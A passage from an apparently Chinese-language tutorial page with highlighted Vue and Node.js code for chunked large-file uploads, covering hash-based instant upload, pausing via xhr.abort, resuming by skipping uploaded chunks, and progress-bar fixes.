class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">           <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">         );</span><br><span class="line">       <span class="keyword">if</span> (!shouldUpload) &#123;</span><br><span class="line">           <span class="variable language_">this</span>.<span class="property">$message</span>.<span class="title function_">success</span>(<span class="string">&quot;秒传：上传成功&quot;</span>);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;, index</span>) =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">    index,</span><br><span class="line">    <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> + <span class="string">&quot;-&quot;</span> + index,</span><br><span class="line">    <span class="attr">chunk</span>: file,</span><br><span class="line">    <span class="attr">percentage</span>: <span class="number">0</span></span><br><span class="line">  &#125;));</span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>秒传其实就是给用户看的障眼法，实质上根本没有上传<br /><img src="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300741-7b208cf0-fd2b-4877-9aab-a3c7fa60dc41.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300741-7b208cf0-fd2b-4877-9aab-a3c7fa60dc41.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />服务端的逻辑非常简单，新增一个验证接口，验证文件是否存在即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">+ const extractExt = filename =&gt;</span><br><span class="line">+  filename.slice(filename.lastIndexOf(&quot;.&quot;), filename.length); // 提取后缀名</span><br><span class="line">const UPLOAD_DIR = path.resolve(__dirname, &quot;..&quot;, &quot;target&quot;); // 大文件存储目录</span><br><span class="line">const resolvePost = req =&gt;</span><br><span class="line">  new Promise(resolve =&gt; &#123;</span><br><span class="line">    let chunk = &quot;&quot;;</span><br><span class="line">    req.on(&quot;data&quot;, data =&gt; &#123;</span><br><span class="line">      chunk += data;</span><br><span class="line">    &#125;);</span><br><span class="line">    req.on(&quot;end&quot;, () =&gt; &#123;</span><br><span class="line">      resolve(JSON.parse(chunk));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">server.on(&quot;request&quot;, async (req, res) =&gt; &#123;</span><br><span class="line">  if (req.url === &quot;/verify&quot;) &#123;</span><br><span class="line">+    const data = await resolvePost(req);</span><br><span class="line">+    const &#123; fileHash, filename &#125; = data;</span><br><span class="line">+    const ext = extractExt(filename);</span><br><span class="line">+    const filePath = path.resolve(UPLOAD_DIR, `$&#123;fileHash&#125;$&#123;ext&#125;`);</span><br><span class="line">+    if (fse.existsSync(filePath)) &#123;</span><br><span class="line">+      res.end(</span><br><span class="line">+        JSON.stringify(&#123;</span><br><span class="line">+          shouldUpload: false</span><br><span class="line">+        &#125;)</span><br><span class="line">+      );</span><br><span class="line">+    &#125; else &#123;</span><br><span class="line">+      res.end(</span><br><span class="line">+        JSON.stringify(&#123;</span><br><span class="line">+          shouldUpload: true</span><br><span class="line">+        &#125;)</span><br><span class="line">+      );</span><br><span class="line">+    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(3000, () =&gt; console.log(&quot;正在监听 3000 端口&quot;));</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><a name="fh147"></a></p><h2 id="暂停上传"><a href="#暂停上传" class="headerlink" title="暂停上传"></a>暂停上传</h2><p>讲完了生成 hash 和文件秒传，回到断点续传<br />断点续传顾名思义即断点 + 续传，所以我们第一步先实现“断点”，也就是暂停上传<br />原理是使用 XMLHttpRequest 的 <code>abort</code> 方法，可以取消一个 xhr 请求的发送，为此我们需要将上传每个切片的 xhr 对象保存起来，我们再改造一下 request 方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">request</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">  url,</span></span><br><span class="line"><span class="params">  method = <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="params">  data,</span></span><br><span class="line"><span class="params">  headers = &#123;&#125;,</span></span><br><span class="line"><span class="params">  onProgress = e =&gt; e,</span></span><br><span class="line"><span class="params">  +     requestList</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="property">upload</span>.<span class="property">onprogress</span> = onProgress;</span><br><span class="line">    xhr.<span class="title function_">open</span>(method, url);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(headers).<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span></span><br><span class="line">      xhr.<span class="title function_">setRequestHeader</span>(key, headers[key])</span><br><span class="line">                                );</span><br><span class="line">    xhr.<span class="title function_">send</span>(data);</span><br><span class="line">    xhr.<span class="property">onload</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      +          <span class="comment">// 将请求成功的 xhr 从列表中删除</span></span><br><span class="line">        +          <span class="keyword">if</span> (requestList) &#123;</span><br><span class="line">          +            <span class="keyword">const</span> xhrIndex = requestList.<span class="title function_">findIndex</span>(<span class="function"><span class="params">item</span> =&gt;</span> item === xhr);</span><br><span class="line">      +            requestList.<span class="title function_">splice</span>(xhrIndex, <span class="number">1</span>);</span><br><span class="line">      +          &#125;</span><br><span class="line">    <span class="title function_">resolve</span>(&#123;</span><br><span class="line">      <span class="attr">data</span>: e.<span class="property">target</span>.<span class="property">response</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  +        <span class="comment">// 暴露当前 xhr 给外部</span></span><br><span class="line">    +        requestList?.<span class="title function_">push</span>(xhr);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;,</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这样在上传切片时传入 requestList 数组作为参数，request 方法就会将所有的 xhr 保存在数组中了<br /><img src="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300757-94a96d06-f062-4781-88ba-43e341f88d21.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300757-94a96d06-f062-4781-88ba-43e341f88d21.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />每当一个切片上传成功时，将对应的 xhr 从 requestList 中删除，所以 requestList 中只保存<code>正在上传切片的 xhr</code><br />之后新建一个暂停按钮，当点击按钮时，调用保存在 requestList 中 xhr 的 abort 方法，即取消并清空所有正在上传的切片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">handlePause() &#123;</span><br><span class="line">    this.requestList.forEach(xhr =&gt; xhr?.abort());</span><br><span class="line">    this.requestList = [];</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300759-fb955ace-99a2-48ae-bc2e-0007baf433ac.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300759-fb955ace-99a2-48ae-bc2e-0007baf433ac.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="zm3d9"></a></p><h2 id="恢复上传"><a href="#恢复上传" class="headerlink" title="恢复上传"></a>恢复上传</h2><p>之前在介绍断点续传的时提到使用第二种服务端存储的方式实现续传<br />由于当文件切片上传后，服务端会建立一个文件夹存储所有上传的切片，所以每次前端上传前可以调用一个接口，服务端将已上传的切片的切片名返回，前端再跳过这些已经上传切片，这样就实现了“续传”的效果<br />而这个接口可以和之前秒传的验证接口合并，前端每次上传前发送一个验证的请求，返回两种结果</p><ul><li>服务端已存在该文件，不需要再次上传</li><li>服务端不存在该文件或者已上传部分文件切片，通知前端进行上传，并把<strong>已上传</strong>的文件切片返回给前端</li></ul><p>所以我们改造一下之前文件秒传的服务端验证接口</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">extractExt</span> = filename =&gt;</span><br><span class="line">  filename.<span class="title function_">slice</span>(filename.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>), filename.<span class="property">length</span>); <span class="comment">// 提取后缀名</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">UPLOAD_DIR</span> = path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;..&quot;</span>, <span class="string">&quot;target&quot;</span>); <span class="comment">// 大文件存储目录</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">resolvePost</span> = req =&gt;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> chunk = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      chunk += data;</span><br><span class="line">    &#125;);</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;end&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(chunk));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">+  <span class="comment">// 返回已经上传切片名列表</span></span><br><span class="line">  + <span class="keyword">const</span> <span class="title function_">createUploadedList</span> = <span class="keyword">async</span> fileHash =&gt;</span><br><span class="line">    +   fse.<span class="title function_">existsSync</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, fileHash))</span><br><span class="line">    +    ? <span class="keyword">await</span> fse.<span class="title function_">readdir</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, fileHash))</span><br><span class="line">    +    : [];</span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&quot;request&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">url</span> === <span class="string">&quot;/verify&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">resolvePost</span>(req);</span><br><span class="line">    <span class="keyword">const</span> &#123; fileHash, filename &#125; = data;</span><br><span class="line">    <span class="keyword">const</span> ext = <span class="title function_">extractExt</span>(filename);</span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, <span class="string">`<span class="subst">$&#123;fileHash&#125;</span><span class="subst">$&#123;ext&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">if</span> (fse.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">      res.<span class="title function_">end</span>(</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">          <span class="attr">shouldUpload</span>: <span class="literal">false</span></span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">end</span>(</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">          <span class="attr">shouldUpload</span>: <span class="literal">true</span>，</span><br><span class="line">            +         <span class="attr">uploadedList</span>: <span class="keyword">await</span> <span class="title function_">createUploadedList</span>(fileHash)</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;正在监听 3000 端口&quot;</span>));</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>接着回到前端，前端有两个地方需要调用验证的接口</p><ul><li>点击上传时，检查是否需要上传和已上传的切片</li><li>点击暂停后的恢复上传，返回已上传的切片</li></ul><p>新增恢复按钮并改造原来上传切片的逻辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">type</span>=<span class="string">&quot;file&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">@<span class="attr">change</span>=<span class="string">&quot;handleFileChange&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;handleUpload&quot;</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;handlePause&quot;</span> <span class="attr">v-if</span>=<span class="string">&quot;isPaused&quot;</span>&gt;</span>暂停<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  +      <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;handleResume&quot;</span> <span class="attr">v-else</span>&gt;</span>恢复<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  //...</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &lt;/template&gt;</span><br><span class="line">  +   <span class="keyword">async</span> <span class="title function_">handleResume</span>(<span class="params"></span>) &#123;</span><br><span class="line">  +      <span class="keyword">const</span> &#123; uploadedList &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">    +        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">    +        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">    +      );</span><br><span class="line">  +      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>(uploadedList);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line">  +     <span class="keyword">const</span> &#123; shouldUpload, uploadedList &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">if</span> (!shouldUpload) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$message</span>.<span class="title function_">success</span>(<span class="string">&quot;秒传：上传成功&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;, index</span>) =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">    index,</span><br><span class="line">    <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> + <span class="string">&quot;-&quot;</span> + index,</span><br><span class="line">    <span class="attr">chunk</span>: file，</span><br><span class="line">      <span class="attr">percentage</span>: <span class="number">0</span></span><br><span class="line">&#125;));</span><br><span class="line">+      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>(uploadedList);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 上传切片，同时过滤已上传的切片</span></span><br><span class="line">+   <span class="keyword">async</span> <span class="title function_">uploadChunks</span>(<span class="params">uploadedList = []</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> requestList = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">    +        .<span class="title function_">filter</span>(<span class="function">(<span class="params">&#123; hash &#125;</span>) =&gt;</span> !uploadedList.<span class="title function_">includes</span>(hash))</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; chunk, hash, index &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;chunk&quot;</span>, chunk);</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;hash&quot;</span>, hash);</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>);</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;fileHash&quot;</span>, <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>);</span><br><span class="line">      <span class="keyword">return</span> &#123; formData, index &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">map</span>(<span class="keyword">async</span> (&#123; formData, index &#125;) =&gt;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: formData,</span><br><span class="line">        <span class="attr">onProgress</span>: <span class="variable language_">this</span>.<span class="title function_">createProgressHandler</span>(<span class="variable language_">this</span>.<span class="property">data</span>[index]),</span><br><span class="line">        <span class="attr">requestList</span>: <span class="variable language_">this</span>.<span class="property">requestList</span></span><br><span class="line">      &#125;)</span><br><span class="line">        );</span><br><span class="line">  <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(requestList);</span><br><span class="line">  <span class="comment">// 之前上传的切片数量 + 本次上传的切片数量 = 所有切片数量时</span></span><br><span class="line">  <span class="comment">// 合并切片</span></span><br><span class="line">  +      <span class="keyword">if</span> (uploadedList.<span class="property">length</span> + requestList.<span class="property">length</span> === <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">mergeRequest</span>();</span><br><span class="line">    +      &#125;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这里给原来上传切片的函数新增 uploadedList 参数，即上图中服务端返回的切片名列表，通过 filter 过滤掉已上传的切片，并且由于新增了已上传的部分，所以之前合并接口的触发条件做了一些改动<br />到这里断点续传的功能基本完成了<br><a name="BsZm5"></a></p><h2 id="进度条改进"><a href="#进度条改进" class="headerlink" title="进度条改进"></a>进度条改进</h2><p>虽然实现了断点续传，但还需要修改一下进度条的显示规则，否则在暂停上传&#x2F;接收到已上传切片时的进度条会出现偏差<br><a name="1s458"></a></p><h3 id="切片进度条-1"><a href="#切片进度条-1" class="headerlink" title="切片进度条"></a>切片进度条</h3><p>由于在点击上传&#x2F;恢复上传时，会调用验证接口返回已上传的切片，所以需要将已上传切片的进度变成 100%</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line">  <span class="keyword">const</span> &#123; shouldUpload, uploadedList &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">if</span> (!shouldUpload) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$message</span>.<span class="title function_">success</span>(<span class="string">&quot;秒传：上传成功&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;, index</span>) =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">    index,</span><br><span class="line">    <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> + <span class="string">&quot;-&quot;</span> + index,</span><br><span class="line">    <span class="attr">chunk</span>: file,</span><br><span class="line">    +       <span class="attr">percentage</span>: uploadedList.<span class="title function_">includes</span>(index) ? <span class="number">100</span> : <span class="number">0</span></span><br><span class="line">  &#125;));</span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>(uploadedList);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>uploadedList 会返回已上传的切片，在遍历所有切片时判断当前切片是否在已上传列表里即可<br><a name="5zH8x"></a></p><h3 id="文件进度条-1"><a href="#文件进度条-1" class="headerlink" title="文件进度条"></a>文件进度条</h3><p>之前说到文件进度条是一个计算属性，根据所有切片的上传进度计算而来，这就遇到了一个问题<br /><img src="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300751-3d3e923f-9638-4755-9d41-66ecff57f507.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300751-3d3e923f-9638-4755-9d41-66ecff57f507.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />当点击恢复时，由于重新创建了 xhr 导致切片进度清零，所以总进度条就会倒退<br />解决方案是创建一个“假”的进度条，这个假进度条基于文件进度条，但只会停止和增加，然后给用户展示这个假的进度条<br />这里我们使用 Vue 的监听属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">      <span class="attr">fakeUploadPercentage</span>: <span class="number">0</span></span><br><span class="line">&#125;),</span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">  <span class="title function_">uploadPercentage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span> || !<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">length</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 